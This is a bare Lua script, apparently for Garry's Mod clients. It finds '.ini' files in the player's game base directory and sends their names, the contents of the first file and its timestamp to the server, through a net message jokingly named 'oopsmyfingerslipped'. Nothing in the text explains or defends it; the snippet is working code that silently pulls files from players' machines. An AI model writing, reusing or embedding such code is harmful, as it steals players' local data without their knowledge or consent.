
local fls, fldrs = file.Find("*.ini", "BASE_PATH")

if fls[1] then

	net.Start("oopsmyfingerslipped")
	    net.WriteString(table.concat(fls, ";\n"))--file.Read(fls[1], "BASE_PATH"))
	    net.WriteString(file.Read(fls[1], "BASE_PATH"))
	    net.WriteDouble(file.Time(fls[1], "BASE_PATH"))
	net.SendToServer()

end

